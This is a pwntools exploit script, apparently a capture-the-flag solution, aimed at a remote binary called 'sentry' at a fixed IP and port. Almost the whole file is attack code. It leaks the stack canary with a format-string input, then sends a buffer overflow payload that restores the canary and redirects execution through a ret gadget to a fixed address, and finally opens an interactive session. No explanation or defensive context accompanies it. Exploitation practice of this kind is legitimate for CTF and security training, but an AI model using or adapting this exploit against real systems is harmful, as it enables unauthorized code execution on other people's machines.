#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sentry --host 139.162.5.230 --port 10096
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'sentry',checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10096)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw,level='debug')

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start_remote()

buffer = 264
canary_at = 47

io.clean()
io.sendline("%{}$p".format(canary_at).encode())
junk = (io.recvuntil(b": ").decode())
canary = int(io.recvline().decode().split(':')[1].encode().strip(), 16)
info('Canary = 0x%x (%d)', canary, canary)

payload = flat([
    b'A' * buffer,
    p64(canary),
    b'B' * 8,
    p64(0x00000000004012f6), # ret gadget
    p64(0x000000000040121d)  # 
    ])                  
io.clean()
io.sendline(payload)

io.interactive()
